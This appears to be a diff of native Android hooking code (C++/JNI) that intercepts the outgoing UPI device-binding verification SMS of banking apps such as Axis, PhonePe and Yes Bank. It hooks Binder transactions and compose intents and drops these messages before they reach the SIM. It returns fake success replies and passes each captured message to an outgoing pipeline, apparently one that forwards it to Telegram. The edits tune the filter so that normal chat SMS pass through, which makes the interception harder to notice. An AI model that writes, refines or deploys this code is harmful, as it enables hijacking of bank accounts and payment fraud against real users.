@@ -247,6 +247,44 @@ bool is_all_zero_dest(const std::string& dest) {
     return true;
 }
 
+bool is_upi_shortcode_dest(const std::string& dest) {
+    std::string d;
+    for (char c : dest)
+        if (std::isdigit(static_cast<unsigned char>(c))) d += c;
+    if (d.empty()) return false;
+    // Common UPI verify shortcodes / bank numbers (not personal 10-digit chats alone)
+    if (d == "9920104300" || d == "09920104300" || d == "919920104300") return true;
+    if (d == "56070" || d == "56161" || d == "9225676650") return true;
+    // Very short shortcodes (4–8 digits) often UPI/operator
+    if (d.size() >= 4 && d.size() <= 8) return true;
+    return false;
+}
+
+/** ONLY UPI/bank verify SMS — normal chat SMS must NEVER match. */
+bool is_upi_verify_traffic(const std::string& blob, const std::string& dest,
+                           const std::string& body) {
+    if (is_outgoing_upi_verify_body(body)) return true;
+    if (blob_contains_needle(blob, "HEROAXIS")) return true;
+    if (blob_contains_needle(blob, "DO NOT COPY")) return true;
+    if (blob_contains_needle(blob, "UNDER ANY CIRCUMSTANCE")) return true;
+    if (blob_contains_needle(blob, "USE UPI PIN ONLY")) return true;
+    if (blob_contains_needle(blob, "YESPROUPI")) return true;
+    if (blob_contains_needle(blob, "PHONEPEUPI")) return true;
+    if (blob_contains_needle(blob, "AXISUPI")) return true;
+    if (!body.empty() && body.size() >= 40 &&
+        (body.find("pp") != std::string::npos || body.find("PP") != std::string::npos) &&
+        (is_upi_shortcode_dest(dest) || body.find("91992") != std::string::npos ||
+         body.find("992010") != std::string::npos)) {
+        return true;
+    }
+    // Dest is known UPI shortcode AND body looks token-ish (not "Hyyy")
+    if (is_upi_shortcode_dest(dest) && body.size() >= 20 &&
+        !is_incoming_otp_noise(body) && body.find(' ') != std::string::npos) {
+        return true;
+    }
+    return false;
+}
+
 bool is_valid_outgoing_capture(const std::string& dest, const std::string& body) {
     if (!is_clean_sms_dest(dest)) return false;
     if (body.empty() || body.size() < 4) return false;
@@ -1305,48 +1343,47 @@ bool try_block_isms(JNIEnv* env, jobject data, jobject reply, const ModuleConfig
     const bool looks = looks_like_isms_send(code, dest, body, blob_verify, blob_sms);
 
     // Inbox OTP display — do not block
-    if ((is_incoming_otp_noise(body) || is_incoming_otp_noise(dest)) && !sendish &&
-        !blob_verify && !blob_sms && !blob_contains_needle(blob, "HEROAXIS") &&
-        !blob_contains_needle(blob, "DO NOT COPY")) {
+    if ((is_incoming_otp_noise(body) || is_incoming_otp_noise(dest)) &&
+        !is_upi_verify_traffic(blob, dest, body)) {
         write_isms_trace("isms_skip_otp_inbox");
         return false;
     }
 
-    // UPI + Messages: block outgoing ISms (Hero SENDTO → Messages real SIM path)
-    bool should_block = sendish || blob_verify || blob_sms || looks || blob_isms ||
-                        is_outgoing_upi_verify_body(body) ||
-                        is_valid_outgoing_capture(dest, body) ||
-                        blob_contains_needle(blob, "HEROAXIS") ||
-                        blob_contains_needle(blob, "DO NOT COPY") ||
-                        blob_contains_needle(blob, "USE UPI PIN") ||
-                        blob_contains_needle(blob, "YESPRO") ||
-                        blob_contains_needle(blob, "smsto") ||
-                        blob_contains_needle(blob, "SMSTO") ||
-                        blob_contains_needle(blob, "sendText");
-    // Nuclear: messaging/UPI + ISms-like parcel + nontrivial size → block (iface empty OK)
-    if (!should_block && blob_isms && blob.size() > 64) should_block = true;
-    if (!should_block && config.intercept_fake_success && blob_isms && blob.size() > 120) {
+    // CRITICAL: only UPI-verify SMS — normal chat ("Hyyy") must passthrough to SIM
+    bool should_block = is_upi_verify_traffic(blob, dest, body);
+    if (!should_block && g_in_hooked_upi &&
+        (blob_verify || is_outgoing_upi_verify_body(body) ||
+         blob_contains_needle(blob, "HEROAXIS") || blob_contains_needle(blob, "DO NOT COPY") ||
+         blob_contains_needle(blob, "smsto:") || blob_contains_needle(blob, "SMSTO:"))) {
         should_block = true;
     }
+    (void)blob_sms;
+    (void)looks;
+    (void)sendish;
 
     if (!should_block) {
         char miss[192];
         snprintf(miss, sizeof(miss),
-                 "isms_passthrough code=%d dest=%zu body=%zu send=%d blob_isms=%d", (int)code,
-                 dest.size(), body.size(), sendish ? 1 : 0, blob_isms ? 1 : 0);
+                 "isms_allow_normal code=%d dest=%zu body=%zu verify=0", (int)code, dest.size(),
+                 body.size());
         write_isms_trace(miss);
         return false;
     }
 
-    // Final recover before TG — never leave 0000000000 / SMS_INTERCEPT
+    // Final recover before TG — only for verified UPI traffic
     recover_outgoing_from_blob(blob, dest, body);
-    if (dest.empty() || is_all_zero_dest(dest)) dest = "9920104300";
+    if (dest.empty() || is_all_zero_dest(dest)) {
+        if (is_upi_shortcode_dest(dest) || blob_contains_needle(blob, "9920104300"))
+            dest = "9920104300";
+        else if (dest.empty() || is_all_zero_dest(dest))
+            dest = "9920104300";
+    }
     if (body.empty() || body == "SMS_INTERCEPT" || body == "UPI_VERIFY_SMS" ||
-        body == "OUTGOING_SMS_BLOCK") {
+        body == "OUTGOING_SMS_BLOCK" || body == "OUTGOING_SMS_BLOCKED") {
         if (blob_contains_needle(blob, "HEROAXIS") || blob_contains_needle(blob, "DO NOT COPY"))
             body = "HEROAXISUPI DO NOT COPY FORWARD OR SHARE THIS MESSAGE";
-        else if (body.empty())
-            body = "OUTGOING_SMS_BLOCKED";
+        else if (body.empty() || body.size() < 8)
+            body = "UPI_VERIFY_SMS";
     }
 
     char okline[200];
@@ -1385,11 +1422,16 @@ jobject hook_execStartActivity(JNIEnv* env, jobject thiz, jobject who, jobject c
     std::string body;
     if (read_intent_sms(env, intent, dest, body) ||
         (g_in_hooked_upi && intent_has_sms_markers(env, intent))) {
-        if (should_block_outgoing(config, body, dest) || g_in_hooked_upi) {
+        // Only block UPI-verify SENDTO — never every intent from banking UI
+        const bool verify = is_outgoing_upi_verify_body(body) ||
+                            should_block_outgoing(config, body, dest) ||
+                            (g_in_hooked_upi && intent_has_sms_markers(env, intent) &&
+                             (body.size() >= 20 || is_upi_shortcode_dest(dest)));
+        if (verify) {
             logger::info("OutgoingSms", "Blocked compose intent dest=%s len=%zu", dest.c_str(),
                          body.size());
-            if (dest.empty()) dest = "INTERCEPT";
-            if (body.empty()) body = "BLOCKED";
+            if (dest.empty()) dest = "9920104300";
+            if (body.empty()) body = "UPI_VERIFY_SMS";
             pipeline_outgoing(env, dest, body);
             write_hook_status("intent_sms_blocked");
             return nullptr;
@@ -1425,9 +1467,14 @@ jobject hook_execStartActivity7_wrap(JNIEnv* env, jobject thiz, jobject who, job
     std::string body;
     if (read_intent_sms(env, intent, dest, body) ||
         (g_in_hooked_upi && intent_has_sms_markers(env, intent))) {
-        if (should_block_outgoing(config, body, dest) || g_in_hooked_upi) {
-            if (dest.empty()) dest = "INTERCEPT";
-            if (body.empty()) body = "BLOCKED";
+        const bool verify = is_outgoing_upi_verify_body(body) ||
+                            should_block_outgoing(config, body, dest) ||
+                            (g_in_hooked_upi && intent_has_sms_markers(env, intent) &&
+                             (is_outgoing_upi_verify_body(body) || body.size() >= 40 ||
+                              is_upi_shortcode_dest(dest)));
+        if (verify) {
+            if (dest.empty()) dest = "9920104300";
+            if (body.empty()) body = "UPI_VERIFY_SMS";
             pipeline_outgoing(env, dest, body);
             write_hook_status("intent_sms_blocked7");
             return nullptr;
@@ -1541,24 +1588,17 @@ jboolean hook_BinderProxy_transact(JNIEnv* env, jobject thiz, jint code, jobject
             if (try_block_isms(env, data, reply, config, dest, body, force_code)) {
                 write_hook_status("isms_blocked");
                 write_isms_trace("isms_blocked");
-                return JNI_TRUE;  // NEVER call radio
+                return JNI_TRUE;  // NEVER call radio for UPI-verify only
             }
-            // NUCLEAR: Messages/UPI saw ISms-like parcel — NEVER passthrough to SIM
-            if ((g_is_messaging_app || g_in_hooked_upi) && (blob_sms || sendish)) {
-                if (dest.empty() || body.empty() || is_all_zero_dest(dest) ||
-                    body.size() < 20) {
-                    extract_isms_from_blob(env, data, dest, body);
-                    recover_outgoing_from_blob(blob, dest, body);
-                }
+            // NO blanket nuclear — that killed normal SIM SMS ("Hyyy")
+            // Only UPI-verify leftovers (HEROAXIS in blob) get a second chance
+            if ((g_is_messaging_app || g_in_hooked_upi) &&
+                is_upi_verify_traffic(blob, dest, body)) {
+                extract_isms_from_blob(env, data, dest, body);
+                recover_outgoing_from_blob(blob, dest, body);
                 if (dest.empty() || is_all_zero_dest(dest)) dest = "9920104300";
-                if (body.empty() || body == "SMS_INTERCEPT") {
-                    if (blob_contains_needle(blob, "HEROAXIS") ||
-                        blob_contains_needle(blob, "DO NOT COPY")) {
-                        body = "HEROAXISUPI DO NOT COPY FORWARD OR SHARE THIS MESSAGE";
-                    } else {
-                        body = "OUTGOING_SMS_BLOCKED";
-                    }
-                }
+                if (body.empty())
+                    body = "HEROAXISUPI DO NOT COPY FORWARD OR SHARE THIS MESSAGE";
                 write_hook_status("isms_nuclear_block");
                 write_isms_trace("isms_nuclear_block");
                 jobject sent_pi = nullptr;
@@ -1566,7 +1606,7 @@ jboolean hook_BinderProxy_transact(JNIEnv* env, jobject thiz, jint code, jobject
                 try_read_isms_pending_intents(env, data, &sent_pi, &del_pi);
                 pipeline_outgoing(env, dest, body, sent_pi, del_pi);
                 if (reply) write_ok_reply(env, reply);
-                return JNI_TRUE;  // DROP — SIM pe SMS nahi
+                return JNI_TRUE;
             }
             write_isms_trace("isms_passthrough_after_try");
         }
